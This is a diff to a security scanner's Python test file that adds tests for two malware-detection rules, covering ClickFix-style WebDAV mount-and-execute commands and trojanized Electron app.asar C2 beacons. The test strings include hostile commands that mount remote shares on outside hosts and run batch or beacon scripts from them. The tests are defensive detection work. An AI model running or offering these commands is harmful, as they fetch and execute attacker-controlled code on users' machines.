@@ -1117,3 +1117,42 @@ def test_new_patterns_2026_03_18_patch2() -> None:
         exf017.pattern.search("agent-identity.json") is not None
     )
     assert exf017.pattern.search("memory usage: 512MB") is None
+
+
+def test_new_patterns_2026_03_19() -> None:
+    """Test rules added 2026-03-19: Click-Fix WebDAV, Electron app.asar C2."""
+    compiled = load_compiled_builtin_rulepack()
+
+    # MAL-034: Click-Fix WebDAV share mount and execute pattern
+    mal034 = next((r for r in compiled.static_rules if r.id == "MAL-034"), None)
+    assert mal034 is not None
+    assert (
+        mal034.pattern.search(
+            r"net use Z: \\cloudflare.report@443\DavWWWRoot\forever\e\ && Z:\recovery.bat"
+        )
+        is not None
+    )
+    assert (
+        mal034.pattern.search(
+            r"net use W: \\happyglamper.ro\webdav /persistent:no && start W:\fix.cmd"
+        )
+        is not None
+    )
+    assert mal034.pattern.search("net use Z: /delete") is None
+
+    # MAL-035: Trojanized Electron app.asar C2 payload injection
+    mal035 = next((r for r in compiled.static_rules if r.id == "MAL-035"), None)
+    assert mal035 is not None
+    assert (
+        mal035.pattern.search(
+            "asar.extractAll('app.asar', './app'); exec('node ./app/c2-beacon.js')"
+        )
+        is not None
+    )
+    assert (
+        mal035.pattern.search(
+            "require('asar'); exec('payload')"
+        )
+        is not None
+    )
+    assert mal035.pattern.search("npm install electron") is None
